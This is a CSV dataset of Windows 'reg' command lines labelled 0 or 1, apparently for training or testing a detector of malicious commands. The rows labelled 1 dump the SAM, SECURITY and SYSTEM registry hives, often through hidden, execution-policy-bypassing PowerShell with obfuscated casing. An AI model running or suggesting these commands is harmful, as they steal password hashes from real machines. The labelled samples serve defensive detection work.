text,label
"Reg   copY   ""hKeY_uSeRS\COnTROl pAnEl\dEskTOp\sUBKEY10""   ""hKEy_users\SySTem\currENtcoNtROLSEt\sErViCeS_523""",0
PWSh -NoPROFile -C rEg   expOrt  HKlm\SEcURItY  %temP%\seC_BAckuP.dat  /Y,1
"reG coMpaRe ""hku\sOFTWARE\PolicIes\MyCORP\SubkEY76"" ""Hku\sOfTWArE\googLE\cHROMe_254""",0
"reG.Exe qUeRy ""HKCU\ENViroNmENT"" /v lAstupdATe",0
powershell -exec bypass -w hidden -c reg export   hklm\security \\localhost\c$\__dump\sam.bak   /y,1
powershell -command reg export  hkey_local_machine\security \\localhost\c$\__dump\sam.bak  /y,1
powErSHELL -EXEC BYpass -w hIDDeN -C Reg.Exe  SaVe hKlM\sECUrIty   c:\usErs\PublIC\reGIstrY_EXport.rEg  /Y,1
pwSh -NoPrOfIlE -c REG ExpoRt  HkLm\SEcUritY \\LocalHOST\c$\__Dump\sam.bAK,1
"rEG  cOmParE  ""hKey_CuRReNt_User\coNTRol PaNEL\DesktoP\sUBkEy65""  ""hKey_curREnT_user\SofTWaRE\GooGLe\chRoME_750""",0
"reg  copy  ""hkcu\hkey_local_machine\software\wow6432node\subkey93""  ""hkcu\software\myapp\settings_485""",0
Reg.eXe eXport HKlm\sEcURITY  c:\usErS\PUBlIc\ReGisTRy_ExPorT.REg,1
"reg unload ""hku\hkey_local_machine\software\policies\microsoft\subkey47"" /v lastupdate",0
cmd.exe /c start /b reg  save   hklm\sam  c:\users\public\registry_export.reg,1
C:\windowS\SYsTem32\cmd.eXe /K REG.ExE EXPoRt   HKlM\SYstEM  C:\WinDowS\tEMP\SAM.SaVe,1
POWersHElL -ExEC BYPASs -W hiDDeN -C Reg  SaVE  HKlm\sAm %temp%\SEc_bAcKUp.daT /y,1
"reG.eXe reSTORe ""hkU\soFTWare\miCRosOft\WINDoWS\CUrRentVErSIon\suBKEy96"" ""Hku\eNVironmENT_444""",0
cMd.Exe /c staRt /b rEG.Exe Save   HKEy_LocaL_MacHInE\Sam   C:\Windows\TEMp\Sam.SaVe  /y,1
cMd.ExE /C REg.exe   SAVe   HkEy_lOcaL_machINE\SYsTEm   %TEMp%\sEC_BAcKUP.dAt  /Y,1
"rEg.exE   resTOre   ""HkEy_UsErs\HKEy_lOcAl_mACHINe\softwaRe\wOw6432nOde\sUbKEy63""   ""Hkey_uSERS\EnVIronMeNT_104""",0
"STart /b rEG  saVe  ""hKcU\softWarE\micRosoFT\WiNDowS\CurrEnTVErSIOn\SubKey47""  ""C:\tEmp\UseR_sETTinGS.reG""  /y",0
"REG  coMpaRe  ""hKeY_cUrreNt_USer\eNVIroNMENT\SubkEY22""  ""hKEY_CurrenT_uSer\HkEY_loCal_maCHine\SysTEm\CuRreNTCoNTrOlsEt\cONTrOl_563""",0
"REg.eXE   UNload   ""HkeY_cURrenT_UseR\SOFTWArE\MYaPP\sETTINgs\suBkeY34""   /v PAtH",0
pOWeRSHElL -cOmmAnd rEG  EXpoRt   hkey_LOcAL_mAcHInE\Sam   C:\WiNdOws\TEmP\saM.SAve,1
Reg.EXe SAve   hKEY_LOcaL_maCHINE\SEcUrity \.\c$ACkuP.reg   /Y,1
"pOwErshell -c ReG.eXe UnlOAd ""HKeY_lOCAl_mAcHInE\softwARe\ClAsSES\sUbkEY78"" /V lASTUPDATe",0
"reg unload ""hkey_current_user\hkey_local_machine\software\wow6432node"" /v path",0
"STArt /B reg uNLOad ""hKCU\soFTwaRE\POlICIeS\mycORp"" /f",0
"reg COmpArE ""hkcU\hKeY_LoCal_MacHinE\SOftWare\pOlIciES\MicrOSOft"" ""HKCu\SofTwarE\googLE\cHrOmE_418""",0
"reg.exe  restore  ""hkey_users\hkey_local_machine\software\wow6432node""  ""hkey_users\control panel\desktop_567""",0
"PoWERshell -C REg save ""hKEy_lOCaL_MaChiNE\hkey_LOcAL_mAChINe\SysTEm\CuRREntCONTRolSet\conTRol\suBKey40"" ""D:\BACkUp\regisTry_hIVE.Dat"" /Y",0
"CmD /c rEG   CoPy   ""HkeY_currENt_user\enVirOnmeNT""   ""HkEY_cuRrent_useR\softWARe\clasSEs_172""",0
"pOWErsHelL -c ReG  COMPARe  ""HkeY_CuRRENt_uSer\sOFTWARe\MiCrOsOft\WiNdoWS\CurReNtvErSIon""  ""HKEy_CurrEnT_uSeR\SOFTWArE\POLiCIes\mYCorP_258""",0
pwsh -noprofile -c reg   export  hkey_local_machine\sam c:\temp\system.hive /y,1
"start /b reg   add   ""hkey_users\hkey_local_machine\software\wow6432node\subkey24""         /d ""1.0.0""",0
"cmd /c rEg.EXe   coPY   ""hKEY_uSerS\SOftwaRE\googLE\CHRomE""   ""hkeY_usErs\COnTRoL paNEl\DESktop_993""",0
"cMd /c rEg.EXe QueRY ""hKCU\soFtwARE\MIcROsOft\wIndOws\cUrRentVERSION\SUbKEY15""",0
c:\WiNDoWS\SYSTEM32\CMd.EXe /K Reg.exE EXport hkEY_lOCAL_machIne\saM  c:\teMp\sYsTem.hiVe /y,1
"rEg.Exe cOMpaRE ""HkU\hKeY_LOcaL_MACHINE\SysTem\cuRrEnTcONTRoLSEt\ControL\SUbKey36"" ""hKU\sOftWare\MIcrosoFt\WindoWS\CurREntversiON_219""",0
"rEG.exe  cOmPARE  ""hKu\Hkey_LOCaL_MachIne\SYStEM\cuRreNtcONtrOLSET\CoNTroL""  ""hkU\eNVironMeNt_779""",0
"reG  DElEtE  ""Hku\sysTem\CURREnTCoNtRoLset\ServiCeS\SuBkey7""  /V pAtH",0
C:\WINDows\sYSteM32\cMD.exe /K rEG.Exe   ExPORt Hkey_LOCaL_maChINe\sYsteM  \.\c$ACkUP.REg,1
poweRsHell -EXEC bYPass -W hiddEN -c reg.exe  eXport   HkLM\SAM  \.\C$ACkuP.REG /Y,1
CMd.eXe /C ReG.exe  sAVe   hklm\SaM %TEmp%\SEC_BAcKuP.dAt  /y,1
reg.exe   export hklm\sam \\localhost\c$\__dump\sam.bak,1
"ReG SAVE ""hkeY_LocaL_MachIne\hKeY_loCAl_mAchIne\SoFTwarE\WoW6432NodE"" ""C:\WInDOws\TEMP\SOfTWarE_duMP.dat"" /Y",0
"REG restorE ""hKEy_userS\sofTwArE\MyaPP\SeTTingS"" ""hkeY_UsERS\hKey_locAL_mAChiNE\SYSTEM\CuRrenTCOntrOLSet\cOntroL_555""",0
"powershell -c reg.exe   compare   ""hkcu\system\currentcontrolset\services\subkey19""   ""hkcu\control panel\desktop_881""",0
powersHELl -COMMANd rEg EXpoRt   hkeY_lOCal_MacHINe\sAm   \\locALhOSt\c$\__duMp\sam.BaK /Y,1
CMD.Exe /C ReG.exe  eXPOrt   hkLm\SecurIty C:\wInDoWS\TeMp\sAm.sAve  /y,1
"sTart /b Reg   comPARe   ""HKEY_CUrrEnt_uSer\soFTWARe\MICroSOfT\wiNdOws\CuRrENTVErsION""   ""hKey_CuRrent_uSEr\cOntrol paNel\DEskTOP_419""",0
"PowERShEll -C reg.eXE   reStORe   ""hkCu\coNTRol pAneL\dEsKToP\suBkey16""   ""HkCu\SOFtware\MIcrosoFt\WINdOWS\CurreNtVErSIon_729""",0
reg  exPOrT   hkEY_LocaL_MaChiNE\SySTEM  c:\UseRs\PUBlIc\reGistRY_expORT.reg /y,1
"reg  save  ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control""  ""c:\windows\temp\software_dump.dat""  /y",0
cmd.eXe /c REG  eXPoRT   HKlM\sECUrIty   C:\wiNdOWS\TEmp\sAm.save /y,1
"reg.exE deleTe ""HKCU\sySTEM\CurRENTCONtRolSET\seRvicES\subkEy53"" /V vErSIOn",0
"ReG quEry ""Hku\cOntrol PaneL\DeSkTOP"" /v versION",0
"reg query ""hkey_users\software\classes""",0
Reg.EXE   SaVe hKLM\Sam  \.\C$acKup.Reg,1
reg.exe save   hklm\security  \.\c$ackup.reg,1
"ReG COpy ""HkEy_loCAL_mACHIne\HKEy_lOCaL_maCHinE\sOFTwARE\poLicieS\micRoSoFt\sUbKey17"" ""Hkey_LOCaL_maCHine\Hkey_LOcal_MAChiNe\sYsTEM\CURRENtCoNtrOlseT\conTroL_393""",0
"reg.exe   compare   ""hkey_users\software\policies\mycorp""   ""hkey_users\system\currentcontrolset\services_917""",0
"reg   cOMPaRe   ""HkcU\SoftwARE\gOoGLE\chrOME""   ""HKcu\ENVIRONmEnT_762""",0
cMd.ExE /c STart /b ReG.ExE sAvE   HKlm\sam  c:\TEMp\SyStem.hIVe   /y,1
"Reg  DElETE  ""hkCu\sOftwarE\classeS\SubkeY9""  /v VERsIoN",0
PwsH -noprOfiLE -C reg SaVe hkLM\systeM %teMp%\SEc_BACKup.dAT,1
"PoWerSHeLL -c REG.EXe   reStoRe   ""HKcu\HkEy_lOCAl_MAchInE\sOftWAre\WOw6432nOde""   ""hkCU\sOFtWaRe\MiCROSoft\wInDOWs\CurrenTVERsIon_294""",0
CMD.EXe /C rEG.exe  sAVe hKEY_Local_MachINe\sYStem C:\TEMP\SySteM.HIvE /Y,1
cMD.ExE /c STaRt /B REG  eXPoRT  hKLm\sYSTem C:\tEmP\system.HiVE,1
c:\windows\system32\cmd.exe /k reg save hklm\sam  c:\users\public\registry_export.reg,1
"poWERsHeLL -C rEG QUEry ""HkeY_cURrEnT_uSEr\CoNTRol PaNeL\DeSKTop"" /V versiOn",0
"REg  AdD  ""HKeY_CUrrEnT_USEr\software\policiEs\myCORP""  /f",0
cmd.exe /c start /b reg.exe export   hklm\sam  %temp%\sec_backup.dat,1
"rEg  CompaRE  ""HKeY_CUrrEnT_useR\HKEy_LOCal_MachINE\SofTwARe\wOw6432NodE""  ""HkEY_cUrReNT_UseR\EnvIRonmeNt_410""",0
"StaRT /b Reg   adD   ""hKCu\COnTrOL PAnEl\DEsKtop""      /t reG_dword   /d ""1.0.0""",0
"ReG.eXe   DElETE   ""Hkcu\SOFtwAre\miCRoSoft\wiNdoWs\CUrReNtVersIOn""",0
c:\wiNdOWS\sYstEM32\cMD.ExE /K REG  SAvE  hKey_loCal_MAchInE\Security  C:\temP\SYsTeM.HiVe,1
"cmD /c poWErShELl -C ""reG.exe   ExpORt hkEy_loCaL_MAcHInE\seCURITY   C:\usERS\PUBLIC\REGIStrY_eXPORT.Reg""",1
"reg.exe query ""hkey_current_user\system\currentcontrolset\services\subkey73"" /f",0
"reG CoPY ""hKEy_lOcAl_machiNe\sOFTWare\GOogle\ChRomE\sUbkey13"" ""hkeY_LOCAL_macHInE\software\mIcrOSOfT\wiNdoWS\cURReNTVERSIOn_979""",0
"stArT /b reg.exe  querY  ""hKeY_current_UsEr\enVIRoNMenT\subkeY13""",0
cmd.eXE /c staRt /b Reg  eXpoRT HKeY_locAl_MAChIne\sAm   C:\wINdOWs\teMp\SaM.SAVe,1
CMd.Exe /c StArt /B REG eXpOrt   HkLm\Sam   %temP%\SeC_baCkup.DaT   /Y,1
CMD.Exe /C reg   EXpORT  HKLM\sam  \.\c$ACKup.reg,1
cmd.EXe /C ReG   save   HkLM\SECUrITy   \.\c$acKuP.rEG,1
Cmd.eXe /C reg SAve   HkEy_LoCAl_MaCHine\seCUrITY C:\WInDoWs\TEmP\saM.sAVE,1
POWErSHELl -ExeC bYPaSs -w HIDDEN -C Reg.exE  eXpORT   HKeY_LoCAl_mAChINE\SaM \.\C$AcKup.REg,1
pwsh -noprofile -c reg.exe   save   hkey_local_machine\system c:\temp\system.hive   /y,1
"REg aDD ""HKey_cUrReNT_user\hkEY_lOCAL_MAcHine\sYstem\CurReNTcontROlSet\contRol""  /t rEg_sz",0
cmd.exe /c reg.exe save  hkey_local_machine\system %temp%\sec_backup.dat /y,1
"reg  add  ""hku\control panel\desktop\subkey56""  /v version  /t reg_sz  /d 1",0
"reg.exe query ""hkey_users\hkey_local_machine\software\wow6432node"" /v lastupdate",0
powershell -exec bypass -w hidden -c reg.exe   export   hkey_local_machine\sam  c:\temp\system.hive   /y,1
"CMD /C poweRshELl -c ""rEg   ExPorT   hkEY_locAl_MaCHInE\sYSTEm c:\TEmp\SySTem.HIvE   /y""",1
cMd.EXe /c rEG sAvE  hKey_LocaL_MaCHiNE\SecURIty  \\LoCAlhOSt\c$\__duMp\Sam.BaK   /Y,1
pwsh -noprofile -c reg save  hkey_local_machine\system c:\windows\temp\sam.save,1
"reG  ADd  ""HKEY_CURrEnt_uSeR\ENVIronmenT\suBKey21""  /v path",0
"REG.exE ADd ""hKeY_CuRREnT_uSer\conTRol PAneL\dEskTOp"" /V VERsioN /t Reg_SZ",0
"ReG.exe   ResTore   ""HkEY_LOcal_mAchinE\sOftWAre\Myapp\sETtinGS""   ""hkey_lOCal_machine\HkEY_LocaL_MACHine\softWaRE\WoW6432nODe_844""",0
"cmd /C ReG  UNLOaD  ""hkEY_Local_MacHine\sofTWARe\gOOgLE\CHroMe\sUBKeY20""",0
"Reg.EXe  QUeRy  ""HKU\sofTwArE\GoOGle\cHRomE\suBKEY92""  /V LaSTUPdate",0
"reG.eXe  DeLeTE  ""hKU\system\cURrenTCoNTRolset\SErvIcES\subkEy51""  /f",0
"reg restore ""hku\software\policies\mycorp\subkey3"" ""hku\environment_681""",0
pwsh -noprofile -c reg   save   hklm\sam  \\localhost\c$\__dump\sam.bak /y,1
"start /b reg  restore  ""hkey_current_user\environment\subkey57""  ""hkey_current_user\control panel\desktop_287""",0
PWSh -noprOFilE -C ReG   EXpORT  hkeY_loCAl_maCHIne\SecurItY   \.\C$aCkup.Reg  /Y,1
reg,0
CMD.ExE /C reg.eXe sAvE  hKlM\SYSTeM   \.\c$acKUp.reG /y,1
powershell -exec bypass -w hidden -c reg.exe save  hkey_local_machine\system c:\windows\temp\sam.save,1
PWsh -nOPRoFIle -c reg.exe sAVe hKlm\SEcurITY  %tEMp%\Sec_BACKUp.dat   /y,1
"cmD /C ReG   REstoRE   ""HkcU\Software\myApP\SETTiNgs""   ""HkCu\ENViRonMenT_341""",0
"reg.exe  add  ""hku\software\classes""  /v version    /d ""c:\program files\app""",0
c:\windows\system32\cmd.exe /k reg.exe  export hklm\sam   c:\windows\temp\sam.save,1
C:\WInDOWs\SySTEM32\cMD.Exe /K reG  ExpoRt  hkEY_lOcAL_MAcHiNe\seCurItY  C:\users\puBLiC\reGisTRY_eXPOrT.rEG   /y,1
"reg.Exe unloAd ""HKcU\SoFtWARe\CLaSsEs\SuBkey82"" /F",0
"Cmd /C POwErsHElL -c ""Reg.exe   expOrt  HKLm\Sam   c:\wiNDowS\teMp\SAm.save""",1
POWERsHell -COmMand Reg.exE eXPOrT HkEy_LOcal_mAChINE\sEcUritY  %TEMp%\Sec_BACkUp.DAt   /y,1
"powershell -c reg.exe   save   ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey76""   ""c:\windows\temp\software_dump.dat""",0
"poWERSheLl -C rEG dELEte ""HKey_uSeRS\SYSTem\CUrREntControlSeT\seRVICEs\subkeY33"" /V verSiOn",0
cmd.exe /c reg  save hkey_local_machine\security  c:\users\public\registry_export.reg  /y,1
"cmd /c reg  save  ""hkey_local_machine\hkey_local_machine\software\policies\microsoft""  ""%temp%\non_sensitive.hive""",0
pOWersheLL -ExEC ByPaSs -W HIDdeN -C reG  expORt HKlm\sYsTeM   \.\C$AcKUp.rEg   /Y,1
POwErsHEll -COMMand REg.ExE  SAVE  HkLm\SECURiTY   C:\UseRs\puBLIc\RegiSTry_eXpOrt.rEg /y,1
"poWeRSheLL -c REg   ADD   ""hkeY_USERS\SoFtwARE\myaPp\seTtINGs\suBKEY3""   /V LasTUPDaTE   /t rEG_DworD",0
POWeRsheLl -EXEC bYPass -W HiDDEn -C Reg.exe EXpoRt  HKey_LOcaL_MaCHINe\SecURItY   \\lOCalHosT\C$\__dUmp\sAM.BaK   /Y,1
pOwErSheLl -ComMAnD REg.Exe expOrT   hKEy_LOCaL_machinE\sEcurity   \\loCalHOst\C$\__DuMP\SAm.BaK /Y,1
"cmd /c powershell -c ""reg export hklm\security   c:\windows\temp\sam.save  /y""",1
"REg.exE   UNlOaD   ""hKEy_USERs\HKeY_LOcAl_mAcHine\SOFtwArE\pOliCiEs\mIcROsOFt""   /f",0
"cmD /c pOwerSHElL -C ""reG.Exe  eXporT HkEY_lOCAl_MAcHINe\SYStEm  c:\USers\pUBlIc\ReGIsTrY_eXpOrT.reg""",1
rEG  ExpoRT   HKey_locAL_MaCHinE\sYSTem  c:\WiNDOWS\temP\SAM.Save /y,1
c:\WINdoWs\sYsTem32\cmd.EXE /K REG SAVE hKEy_lOcaL_macHINE\SeCURiTY   C:\Temp\SysTeM.hIVE /y,1
"Cmd /C reg.ExE aDD ""HkcU\SOFtwAre\myApp\setTiNGS\SubkEY6"" /F /t REG_dWORd /d 1",0
"reg SaVe ""HkEy_lOcaL_macHInE\HkEy_LOcAl_mACHiNe\SysTEm\cURREnTCoNtrOLSET\COnTrOL\subkEY36"" ""C:\usERS\puBliC\cHRoME_DAta.BAK"" /Y",0
"CMD /c REg reStOre ""HKu\sOfTwaRE\GoOGle\chROmE"" ""hKU\COntROL PANel\DesktOp_753""",0
c:\windows\system32\cmd.exe /k reg.exe  save   hklm\security \.\c$ackup.reg,1
rEg SavE   HkEy_LoCal_MAChIne\seCUrIty  c:\WiNDows\temp\sAm.SaVe   /Y,1
"CMD /C POwErsHeLl -c ""reG.eXe  expoRt  hkeY_Local_MaCHine\SECurity   \\LOcALHost\C$\__dUmP\SAm.bak""",1
PowersHeLL -coMmAnD REg.EXE  ExPoRT HKEy_locAl_maCHine\SYsTEm \.\c$AcKuP.reG,1
"reg   restoRe   ""HKu\HKey_LocAl_MAChine\SOfTwARE\wow6432noDE\sUbKey48""   ""HkU\conTROL panel\dEskTop_303""",0
"cMd /c POWerSheLl -C ""REG.Exe   eXpOrT   Hkey_LocAl_mAchIne\sAM C:\winDOws\tEMp\saM.sAve""",1
"REg   UnlOAD   ""hKey_uSeRs\sOFtwARE\poLiciES\mYCORP""",0
pwsh -noprofile -c reg.exe export  hkey_local_machine\security c:\users\public\registry_export.reg /y,1
POweRsHEll -CoMmaND REG sAve hKEy_local_macHInE\SYStEm   C:\TEMp\SySTEM.HiVE,1
"rEG.EXe  UnLOaD  ""hku\SoFtWarE\CLaSsEs""  /v laSTuPDate",0
"powershell -c reg   compare   ""hkey_local_machine\software\microsoft\windows\currentversion""   ""hkey_local_machine\software\microsoft\windows\currentversion_568""",0
Cmd.Exe /c rEg.EXE   sAVe   hKLM\SysTeM   %TemP%\SeC_baCKUp.dAt /y,1
"REg.EXE  ADd  ""hkEY_uSeRS\SOftWArE\PoLICIeS\MyCorP""  /V laSTuPDate  /T Reg_dwoRd  /D ""1.0.0""",0
pwsh -noprofile -c reg.exe save   hkey_local_machine\security c:\users\public\registry_export.reg   /y,1
pwsH -NoproFILE -c rEg sAve  hKLm\saM C:\usERs\pUBliC\rEGiStrY_exPorT.reg  /Y,1
"sTarT /B ReG.exE   RESTorE   ""hKeY_useRS\SoFTwARE\clAsseS""   ""hKEY_usERS\ENVironMeNt_166""",0
rEg  SAvE hkLm\sAm  C:\uSerS\puBLiC\REgisTrY_EXpoRt.ReG,1
pwsh -noprofile -c reg   save hklm\security   c:\windows\temp\sam.save   /y,1
"ReG Save ""hkEy_LOCal_MAcHINE\hKey_lOcal_mACHINE\SYSTeM\CUrreNtCoNtROLset\contrOL\sUBkey95"" ""C:\USeRs\PUblIc\chROMe_datA.BAk""",0
"POWerSHELL -c rEG  QuerY  ""hKEy_useRs\hkEY_loCal_MacHInE\sofTWare\PoliCiES\micrOSoft\SubkEY27""  /V LastuPDatE",0
"reG.EXE  Add  ""hKEy_UseRS\sOFtWarE\MIcROSoft\WiNDoWS\cUrRenTVerSioN""      /d ""1.0.0""",0
powerSHELl -commaND rEG.eXe   SaVe hKeY_LOcAL_MAchiNe\syStEm   c:\uSERS\pubLic\REGistRy_EXporT.ReG,1
"cmd /c pOwERshELl -c ""rEg.EXe  EXPorT   HkEy_loCaL_MAChINe\sYSTeM   C:\tEMp\SYStEM.hive /Y""",1
"REg  rESToRe  ""hkCU\SoftwaRe\mICROSOFt\Windows\currentvERsiOn""  ""hKcu\systEM\cuRREnTCoNtroLsET\SERVIceS_805""",0
"reg.exe   restore   ""hku\system\currentcontrolset\services""   ""hku\hkey_local_machine\software\wow6432node_373""",0
pWsH -nOPRofilE -c rEG.eXe  saVe HKlm\SecuRity \\locaLhosT\c$\__dump\saM.bAk   /Y,1
"cMD /c powERsHELL -C ""Reg.EXe  EXpORT  HKEY_LocaL_MaChiNE\sYSTEm  \.\c$acKUP.rEg""",1
reG  Save hkey_lOcAl_MAChIne\Sam %temp%\Sec_BackuP.daT  /y,1
"PoWerSHeLL -c rEg.ExE   Save   ""HkEY_loCal_mAchINe\Hkey_local_MAcHiNE\SOFtWare\wOw6432nOdE\suBkeY69""   ""C:\USers\pUbLiC\chROme_DatA.BAk""   /y",0
"rEG  aDd  ""hkcU\sOftWArE\ClAsseS""  /f  /T rEg_Dword  /D 1",0
"ReG   reStoRE   ""hkcU\SOftwarE\MiCrOSoft\wiNDowS\currEnTvERSion""   ""hKCU\softWARe\MiCrOsoFt\wINdowS\currentVeRsiOn_612""",0
cmd /c reg save HKEY_LOCAL_MACHINE\Software\Policies C:\Backup\pol.reg,0
"CMD /C poweRShelL -c ""rEg.EXE export  hklm\sysTem  %TeMp%\SeC_bAckUP.dat""",1
"cmd /c reg.exe restore ""hkey_current_user\software\google\chrome\subkey12"" ""hkey_current_user\control panel\desktop_415""",0
cMd.exE /C rEg  eXpoRT  HKey_lOCal_MaChIne\SYsteM   \\locaLHosT\C$\__DUMp\saM.BaK /y,1
PwSh -nOPROFILe -c Reg.exe eXPort   HkEY_Local_mAcHiNE\secuRITY   \\loCALhOST\C$\__dUmp\sAm.BAk  /Y,1
CmD.exE /C reg  SaVe  HkEy_lOcaL_macHINE\SeCurITY  \\LOcalhost\C$\__DUmp\sam.BaK,1
cMD.EXe /c sTaRT /b Reg.ExE eXport HkEy_locAl_MAChiNE\SystEM  \\LocALHosT\C$\__duMP\Sam.Bak   /Y,1
"reg.exe  copy  ""hkcu\control panel\desktop""  ""hkcu\control panel\desktop_843""",0
c:\winDoWS\SySTEm32\cMd.Exe /K ReG   EXPoRt   HKEy_loCAL_maCHIne\sAM   \.\c$aCKUP.Reg   /Y,1
"REg   cOMPARE   ""HkCU\soFTware\cLasSES""   ""hkCU\COnTrOL PaNeL\dESkTOp_831""",0
c:\WINDoWs\SYSTem32\CMD.eXE /k rEG.eXe  sAVe   hklM\sam  c:\teMP\SySTEM.HiVE   /Y,1
"Cmd /C POwERSHElL -C ""ReG.exE EXpoRt   hkEY_loCAl_MACHInE\SysTeM  C:\usERS\PubLIC\REGIsTRY_exPoRt.ReG""",1
"REG  reSTore  ""HKu\hkEY_LoCAL_mAcHINe\soFtwAre\POlICies\MIcROsOft""  ""HKU\SOFtWAre\POliCIEs\MyCORP_282""",0
pwsh -noprofile -c reg.exe   export hkey_local_machine\system \\localhost\c$\__dump\sam.bak  /y,1
"REG  QUErY  ""HkcU\HkEy_lOcAl_MAChIne\soFTWaRE\policiES\miCroSOFT""",0
cmd.Exe /c rEg.eXe expOrt  HKlM\sYsTEM  c:\WiNdOwS\TEmp\sam.SaVE,1
"reg.exe   compare   ""hkey_users\software\microsoft\windows\currentversion\subkey87""   ""hkey_users\software\google\chrome_569""",0
cmd.exe /c start /b reg  save   hkey_local_machine\security \.\c$ackup.reg   /y,1
"cmd /c powershell -c ""reg export   hklm\sam   \\localhost\c$\__dump\sam.bak /y""",1
"reg.exe  add  ""hku\environment""  /f    /d ""1.0.0""",0
"CmD /c PowerShEll -c ""rEG   exporT hkLm\SAm C:\teMP\SYSTEM.hIVE""",1
cmd.eXE /C start /B rEg.eXe   saVe hKlM\sAm  \\lOCaLhOst\c$\__dUMp\sAm.bAK   /y,1
"REG.Exe CoPY ""HKcu\ConTrol pAneL\DEsKtOP\SUbKeY20"" ""HKCu\SysTem\cuRrEnTCOntroLsET\SERviCEs_360""",0
"cMd /c REg.EXe sAve ""hKu\hkEY_locaL_machine\sOFTWARe\WOw6432Node\SUBKEY47"" ""c:\UsERs\publIc\CHrOme_dATa.BAk""",0
cMD.EXE /c reg.EXe  EXpoRT HKlm\sEcURItY  %TEMP%\sec_bACKuP.dAT,1
reg.exe save hkey_local_machine\sam  %temp%\sec_backup.dat /y,1
"REG.eXE   comPare   ""HKeY_cuRreNt_uSER\hKeY_lOcAl_MaChInE\SoftWaRE\pOLIciES\MiCrOSofT""   ""HKey_curReNt_UsER\sOFtWare\PoLIcIES\mYcoRP_292""",0
cmd.exe /c start /b reg.exe  export  hklm\sam   \.\c$ackup.reg,1
"Reg.exE  DELetE  ""hKu\SySTeM\cuRrENtcOntrolsET\sERViceS""  /v VeRSiOn",0
"Reg.exe ReSToRe ""Hku\sOFtWAre\GoOglE\cHROme"" ""hKu\hKey_locaL_machINE\SOftwARe\PolIcIeS\mIcROsofT_697""",0
"powershell -c reg.exe  compare  ""hkcu\environment\subkey100""  ""hkcu\software\microsoft\windows\currentversion_831""",0
"reg delete ""hkey_current_user\hkey_local_machine\software\wow6432node\subkey52"" /v path",0
"cmd /c powershell -c ""reg.exe save   hklm\system \.\c$ackup.reg""",1
powershell -exec bypass -w hidden -c reg.exe   save  hklm\sam   %temp%\sec_backup.dat   /y,1
"reg  compare  ""hkey_current_user\environment""  ""hkey_current_user\system\currentcontrolset\services_596""",0
PoWeRShelL -Exec BYPAsS -w hIdDEN -c ReG sAve HkLM\sYsteM  c:\useRS\publiC\REGistRY_ExPorT.reg /Y,1
cmd.exe /c reg.exe  save hklm\system \.\c$ackup.reg  /y,1
PowErSHELL -EXEC bYPass -w HiddEN -c reg.EXe ExpOrt   HKlm\SYSTeM   c:\usERs\publIC\rEGIsTrY_eXPort.REg,1
"reg compare ""hkey_local_machine\software\microsoft\windows\currentversion\subkey69"" ""hkey_local_machine\software\classes_151""",0
reg.exe  save hkey_local_machine\security c:\users\public\registry_export.reg,1
"STARt /B rEg.EXe QUERy ""HKEY_currEnt_USeR\eNViRoNmEnt\SubKEY3"" /f",0
"starT /B reg   QUeRy   ""HKU\ENvIRONMENt""",0
PoweRsHELL -eXec byPAsS -W HIdden -C reg.EXe   ExPOrT   Hklm\sYsTEm   %tEMP%\Sec_BAcKUP.DaT,1
"staRT /B Reg.EXE COPy ""hku\sofTwaRe\pOLiCies\mycorp"" ""HKu\HkEY_LocaL_MaChINE\SofTWARE\polIcies\micROSOfT_893""",0
"reg save ""hkey_users\hkey_local_machine\system\currentcontrolset\control"" ""c:\users\public\chrome_data.bak""",0
"start /b reg.exe   compare   ""hku\software\classes""   ""hku\hkey_local_machine\system\currentcontrolset\control_751""",0
reg.exe   save  hkey_local_machine\security  c:\windows\temp\sam.save,1
rEg.eXE eXpORt   HkEy_LoCal_machIne\sam  C:\teMp\SYsTEM.hivE /Y,1
"reg.exe  query  ""hku\software\google\chrome\subkey71""  /f",0
c:\windows\system32\cmd.exe /k reg save   hklm\sam  c:\users\public\registry_export.reg   /y,1
"rEg   qUERY   ""hkcU\sOFTwaRE\MYAPP\SETTingS""   /v lASTuPDAtE",0
"pOWeRSHELl -C REG.Exe  COmpARE  ""HKeY_CuRRENt_user\ConTROL paNEL\DESktoP""  ""HkEy_CurrenT_User\hKeY_LOCAl_MacHIne\sOFTWaRe\wOw6432noDe_154""",0
C:\winDOwS\sYSTEm32\cmd.eXe /K rEg.exE saVe  HkEY_LocAL_maChINE\Sam  c:\tEmP\systeM.HIVE  /y,1
POwERSheLl -coMMaNd rEG  sAvE   hklM\SAm   c:\WInDOWS\teMP\SaM.SaVe /y,1
